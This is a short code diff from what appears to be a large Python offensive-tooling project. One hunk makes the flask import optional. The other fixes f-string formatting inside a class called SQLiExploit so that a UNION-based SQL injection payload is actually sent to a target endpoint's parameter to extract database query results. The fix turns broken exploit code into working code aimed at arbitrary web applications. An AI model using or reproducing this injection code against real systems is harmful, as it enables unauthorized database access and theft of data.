@@ -39,7 +39,12 @@ import shutil
 import venv
 import zipfile
 from pathlib import Path
-from flask import Flask, request, jsonify
+try:
+    from flask import Flask, request, jsonify
+except ImportError:
+    Flask = None
+    request = None
+    jsonify = None
 import psutil
 import signal
 import requests
@@ -7446,8 +7451,8 @@ class SQLiExploit:
             payload = f"1' UNION SELECT 1,({query}),3--"
             try:
                 response = self.session.get(
-                    f"{{self.target_url}}{{self.endpoint}}",
-                    params={{self.parameter: payload}}
+                    f"{self.target_url}{self.endpoint}",
+                    params={self.parameter: payload}
                 )
                 
                 # Simple extraction (would need customization per application)
